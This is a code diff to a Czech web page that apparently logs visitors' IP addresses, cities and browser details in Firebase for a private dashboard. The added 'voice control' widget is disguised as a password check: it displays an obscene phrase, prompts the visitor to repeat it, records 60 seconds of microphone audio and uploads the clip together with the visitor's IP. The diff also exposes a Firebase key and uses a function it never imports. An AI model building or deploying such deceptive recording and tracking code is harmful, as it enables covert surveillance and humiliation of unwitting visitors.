@@ -2,8 +2,7 @@
 <html lang="cs">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>s33yuh - dashboard</title>
+  <title>s33yuh dashboard</title>
   <style>
     body {
       background: black;
@@ -12,88 +11,74 @@
       padding: 20px;
     }
     .visit {
-      border-bottom: 1px solid #444;
+      border-bottom: 1px solid #333;
+      padding: 10px 0;
       margin-bottom: 10px;
-      padding-bottom: 10px;
     }
-    .timestamp {
-      color: #888;
-      font-size: 0.9em;
-    }
-    .label {
-      display: inline-block;
-      margin-top: 5px;
-      font-size: 0.9em;
-      color: #aaa;
-    }
-    .nickname-input {
-      background: #222;
-      border: 1px solid #555;
-      color: white;
-      padding: 4px 8px;
-      margin-top: 5px;
-      font-family: monospace;
+    audio {
+      margin-top: 8px;
       width: 100%;
-      box-sizing: border-box;
     }
-    #login-form {
-      max-width: 320px;
-      margin-bottom: 20px;
+    #login {
+      display: flex;
+      flex-direction: column;
+      max-width: 300px;
+      margin: 100px auto;
     }
-    #login-form input {
-      width: 100%;
+    input {
       padding: 8px;
-      margin: 6px 0;
-      box-sizing: border-box;
+      margin: 5px 0;
       font-family: monospace;
-      font-size: 1em;
     }
-    #login-form button {
-      width: 100%;
-      padding: 8px;
-      font-family: monospace;
-      font-size: 1em;
-      cursor: pointer;
-      background: #444;
-      color: white;
+    button {
+      padding: 10px;
+      background: white;
+      color: black;
       border: none;
-    }
-    #logout-btn {
-      margin-bottom: 20px;
-      padding: 8px 16px;
-      font-family: monospace;
-      font-size: 1em;
       cursor: pointer;
-      background: #444;
-      color: white;
-      border: none;
     }
-    #error-msg {
-      color: #f55;
+    #voiceControl {
+      max-width: 300px;
+      margin: 20px auto;
+      text-align: center;
+    }
+    #passwordHint, #repeatPrompt {
+      margin: 10px 0;
+      font-weight: bold;
+    }
+    #repeatPrompt {
+      display: none;
+      color: orange;
+    }
+    #recordingStatus {
       margin-top: 10px;
+      font-style: italic;
+      color: lightgreen;
     }
   </style>
 </head>
 <body>
-  <h1>s33yuh - dashboard</h1>
+  <h1>s33yuh</h1>
 
-  <div id="auth-section">
-    <form id="login-form">
-      <input type="email" id="email" placeholder="Email" required autocomplete="username" />
-      <input type="password" id="password" placeholder="Heslo" required autocomplete="current-password" />
-      <button type="submit">Přihlásit se</button>
-      <div id="error-msg"></div>
-    </form>
+  <div id="voiceControl">
+    <div id="passwordHint">Heslo zní: <em>hoe suck a dick</em></div>
+    <button id="startRecordingBtn">Hlasové ovládání</button>
+    <div id="repeatPrompt">Opakujte heslo</div>
+    <div id="recordingStatus"></div>
   </div>
 
-  <button id="logout-btn" style="display:none;">Odhlásit se</button>
-
-  <div id="visits"></div>
+  <div id="login">
+    <input type="email" id="email" placeholder="Email" />
+    <input type="password" id="password" placeholder="Heslo" />
+    <button id="loginBtn">Přihlásit</button>
+  </div>
+  <div id="visits" style="display: none;"></div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
     import { getDatabase, ref, onChildAdded } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
-    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
+    import { getStorage, ref as storageRef, uploadBytes } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-storage.js";
+    import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyB-RcliC7vlLVsR7arV0Z-Z2ywvFytvwOU",
@@ -107,92 +92,155 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
+    const storage = getStorage(app);
     const auth = getAuth(app);
 
-    const visitsRef = ref(db, 'visits');
-    const container = document.getElementById('visits');
-    const loginForm = document.getElementById('login-form');
-    const emailInput = document.getElementById('email');
-    const passwordInput = document.getElementById('password');
-    const errorMsg = document.getElementById('error-msg');
-    const authSection = document.getElementById('auth-section');
-    const logoutBtn = document.getElementById('logout-btn');
+    const loginBox = document.getElementById('login');
+    const visitsBox = document.getElementById('visits');
 
-    function getNickname(ip) {
-      return localStorage.getItem(`nickname_${ip}`) || '';
-    }
-
-    function saveNickname(ip, name) {
-      localStorage.setItem(`nickname_${ip}`, name);
-    }
-
-    function clearVisits() {
-      container.innerHTML = '';
-    }
-
-    function showVisits() {
-      onChildAdded(visitsRef, (snapshot) => {
-        const data = snapshot.val();
-        const ip = data.ip || 'neznámá';
-        const userAgent = data.userAgent || 'neznámý';
-        const city = data.city || 'neznámé město';
-        const timestamp = new Date(data.timestamp || 0);
-        const savedNickname = getNickname(ip);
-
-        const div = document.createElement('div');
-        div.className = 'visit';
-
-        const nicknameInput = document.createElement('input');
-        nicknameInput.type = 'text';
-        nicknameInput.placeholder = 'Přezdívka';
-        nicknameInput.className = 'nickname-input';
-        nicknameInput.value = savedNickname;
-
-        nicknameInput.addEventListener('input', () => {
-          saveNickname(ip, nicknameInput.value);
-        });
-
-        div.innerHTML = `
-          <div><strong>IP:</strong> ${ip}</div>
-          <div><strong>Město:</strong> ${city}</div>
-          <div><strong>User-Agent:</strong> ${userAgent}</div>
-          <div class="timestamp"><strong>Čas:</strong> ${isNaN(timestamp) ? 'neuvedeno' : timestamp.toLocaleString()}</div>
-          <div class="label">Přezdívka pro tuto IP:</div>
-        `;
-        div.appendChild(nicknameInput);
-        container.prepend(div);
-      });
-    }
-
-    loginForm.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      errorMsg.textContent = '';
+    // Přihlášení
+    document.getElementById('loginBtn').addEventListener('click', async () => {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
       try {
-        await signInWithEmailAndPassword(auth, emailInput.value, passwordInput.value);
-        // Login successful - will trigger onAuthStateChanged
-      } catch (error) {
-        errorMsg.textContent = 'Chyba přihlášení: ' + error.message;
+        await signInWithEmailAndPassword(auth, email, password);
+      } catch (e) {
+        alert("Nepodařilo se přihlásit.");
+        console.error(e);
       }
-    });
-
-    logoutBtn.addEventListener('click', async () => {
-      await signOut(auth);
     });
 
     onAuthStateChanged(auth, (user) => {
       if (user) {
-        // User signed in
-        authSection.style.display = 'none';
-        logoutBtn.style.display = 'inline-block';
-        container.style.display = 'block';
-        clearVisits();
-        showVisits();
+        loginBox.style.display = 'none';
+        visitsBox.style.display = 'block';
+        loadVisits();
       } else {
-        // User signed out
-        authSection.style.display = 'block';
-        logoutBtn.style.display = 'none';
-        container.style.display = 'none';
-        clearVisits();
+        loginBox.style.display = 'flex';
+        visitsBox.style.display = 'none';
+      }
+    });
+
+    function loadVisits() {
+      const visitsRef = ref(db, 'visits');
+      onChildAdded(visitsRef, async (snapshot) => {
+        const data = snapshot.val();
+        const container = document.getElementById('visits');
+        const div = document.createElement('div');
+        div.className = 'visit';
+
+        const ip = data.ip || 'neznámá';
+        const city = data.city || 'neznámé město';
+        const ua = data.userAgent || 'neznámý';
+        const time = new Date(data.timestamp || 0).toLocaleString();
+
+        let audioTag = '';
+        const recordingsPath = `recordings/recording_${snapshot.key}.webm`;
+
+        try {
+          const url = await getDownloadURL(storageRef(storage, recordingsPath));
+          audioTag = `<audio controls src="${url}"></audio>`;
+        } catch (e) {
+          audioTag = `<div style="color: gray;">(žádný záznam)</div>`;
+        }
+
+        div.innerHTML = `
+          <div><strong>IP:</strong> ${ip}</div>
+          <div><strong>Město:</strong> ${city}</div>
+          <div><strong>User-Agent:</strong> ${ua}</div>
+          <div><strong>Čas:</strong> ${time}</div>
+          ${audioTag}
+        `;
+
+        container.prepend(div);
+      });
+    }
+
+    // --- Nahrávání hlasu ---
+
+    const startBtn = document.getElementById('startRecordingBtn');
+    const repeatPrompt = document.getElementById('repeatPrompt');
+    const recordingStatus = document.getElementById('recordingStatus');
+
+    startBtn.addEventListener('click', async () => {
+      startBtn.disabled = true;
+      recordingStatus.textContent = "Čekám na povolení mikrofonu...";
+      repeatPrompt.style.display = 'none';
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        recordingStatus.textContent = "Nahrávání...";
+        
+        const mediaRecorder = new MediaRecorder(stream);
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        mediaRecorder.start();
+
+        // Náhodný čas 5-10s pro zobrazení výzvy "Opakujte heslo"
+        const delay = Math.floor(Math.random() * 5000) + 5000;
+        const promptTimeout = setTimeout(() => {
+          repeatPrompt.style.display = 'block';
+        }, delay);
+
+        // Zastavit nahrávání po 60 sekundách
+        setTimeout(() => {
+          mediaRecorder.stop();
+          repeatPrompt.style.display = 'none';
+          recordingStatus.textContent = "Zpracovávám nahrávku...";
+        }, 60000);
+
+        mediaRecorder.onstop = async () => {
+          clearTimeout(promptTimeout);
+          recordingStatus.textContent = "Nahrávka dokončena, ukládám...";
+
+          const blob = new Blob(chunks, { type: 'audio/webm' });
+
+          // Unikátní název podle času + náhodné číslo (pro jistotu unikátnosti)
+          const uniqueKey = Date.now() + '_' + Math.floor(Math.random() * 100000);
+          const storagePath = `recordings/recording_${uniqueKey}.webm`;
+          const storageReference = storageRef(storage, storagePath);
+
+          try {
+            await uploadBytes(storageReference, blob);
+
+            // Do Realtime DB uložíme základní info + timestamp (bez IP atd. – to už máš ve visits)
+            const visitRef = ref(db, 'visits/' + uniqueKey);
+            await fetch('https://api.ipify.org?format=json') // načteme IP (jen pokud chceš, můžeš vynechat)
+              .then(res => res.json())
+              .then(async data => {
+                const visitData = {
+                  timestamp: Date.now(),
+                  ip: data.ip || 'neznámá',
+                  userAgent: navigator.userAgent,
+                  city: 'neznámé město' // tady můžeš doplnit získání města podle IP, pokud chceš
+                };
+                // Uložíme data do Firebase DB (pokud chceš ukládat i info o nahrávce)
+                await fetch(
+                  `https://s33yuh-3cb81-default-rtdb.europe-west1.firebasedatabase.app/visits/${uniqueKey}.json`,
+                  {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(visitData)
+                  }
+                );
+              });
+
+            recordingStatus.textContent = "Nahrávka úspěšně uložena.";
+          } catch (err) {
+            recordingStatus.textContent = "Chyba při ukládání nahrávky.";
+            console.error(err);
+          }
+
+          startBtn.disabled = false;
+        };
+      } catch (e) {
+        recordingStatus.textContent = "Přístup k mikrofonu zamítnut nebo chyba.";
+        startBtn.disabled = false;
+        console.error(e);
       }
     });
   </script>
